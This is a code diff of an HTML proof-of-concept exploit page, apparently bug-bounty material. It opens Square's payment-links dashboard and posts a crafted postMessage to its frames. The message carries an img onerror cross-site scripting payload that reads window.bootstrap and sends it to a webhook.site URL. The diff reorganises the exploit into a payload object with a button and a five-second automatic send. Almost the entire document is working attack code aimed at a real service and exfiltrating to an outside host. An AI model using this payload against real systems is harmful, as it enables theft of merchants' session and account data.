@@ -1,27 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>postMessage PoC</title>
+  <title>postMessage PoC with Button</title>
 </head>
 <body>
+  <button onclick="sendPayload()">Send Payload</button>
 
   <script>
+    // Open the target window
     var w = window.open('https://app.squareup.com/dashboard/payment-links/new');
 
-setTimeout(function() {
-      for(var i=0; i<10; i++) {
-          try {
-              w.frames[i].postMessage({
-                  name:'LINK_PREVIEW',
-                  data:{type:'INITIALIZE',uuid:'x',data:{
-                      checkout_link:{id:'l',link_type:'ITEM_LINK',checkout_link_data:{name:'P',link_type:'ITEM_LINK',order_details:{line_items:[{item_id:'i',quantity:{quantity:1}}]}}},
-                      related_objects:[{type:'ITEM',id:'i',item_data:{name:'HACKED',description_html:'',description:'<img src=x onerror="(function(){let%20i=document.createElement(\'img\');i.src=\'https://webhook.site/15b86806-2167-4883-8098-97fd962682df?b=\'+encodeURIComponent(JSON.stringify(window.bootstrap));document.body.appendChild(i)})()">',variations:[{type:'ITEM_VARIATION',id:'v',item_variation_data:{item_id:'i',name:'D',pricing_type:'FIXED_PRICING',price_money:{amount:100,currency:'USD'}}}]}}],
-                      settings:{checkout_title:'HACKED'}
-                  }}
-              },'*');
-          } catch(e){}
+    // Your payload object
+    const payload = {
+      name: 'LINK_PREVIEW',
+      data: {
+        type: 'INITIALIZE',
+        uuid: 'x',
+        data: {
+          checkout_link: {
+            id: 'l',
+            link_type: 'ITEM_LINK',
+            checkout_link_data: {
+              name: 'P',
+              link_type: 'ITEM_LINK',
+              order_details: {
+                line_items: [
+                  {
+                    item_id: 'i',
+                    quantity: { quantity: 1 }
+                  }
+                ]
+              }
+            }
+          },
+          related_objects: [
+            {
+              type: 'ITEM',
+              id: 'i',
+              item_data: {
+                name: 'HACKED',
+                description_html: '',
+                description: '<img src=x onerror="(function(){let i=document.createElement(\'img\');i.src=\'https://webhook.site/15b86806-2167-4883-8098-97fd962682df?b=\'+encodeURIComponent(JSON.stringify(window.bootstrap));document.body.appendChild(i)})()">',
+                variations: [
+                  {
+                    type: 'ITEM_VARIATION',
+                    id: 'v',
+                    item_variation_data: {
+                      item_id: 'i',
+                      name: 'D',
+                      pricing_type: 'FIXED_PRICING',
+                      price_money: { amount: 100, currency: 'USD' }
+                    }
+                  }
+                ]
+              }
+            }
+          ],
+          settings: {
+            checkout_title: 'HACKED'
+          }
+        }
       }
-  }, 5000);
+    };
+
+    // Function to send the payload (can be used by setTimeout or button)
+    function sendPayload() {
+      if (!w || w.closed) {
+        alert("Target window is not open.");
+        return;
+      }
+
+      for (var i = 0; i < 10; i++) {
+        try {
+          w.frames[i].postMessage(payload, '*');
+        } catch (e) {
+          // ignore errors for non-existing frames
+        }
+      }
+
+      console.log('Payload sent');
+    }
+
+    // Automatically send after 5 seconds
+    setTimeout(sendPayload, 5000);
   </script>
 </body>
 </html>
